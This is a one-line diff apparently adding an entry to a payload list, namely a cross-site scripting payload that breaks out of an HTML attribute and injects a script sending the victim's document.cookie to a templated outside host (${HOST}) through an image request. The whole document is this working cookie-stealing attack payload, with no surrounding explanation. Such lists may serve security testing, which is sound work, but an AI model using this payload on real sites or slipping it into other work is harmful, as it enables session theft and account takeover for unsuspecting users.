@@ -1,0 +1,1 @@
+"><script>document.write(%22<img src=${HOST}?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>
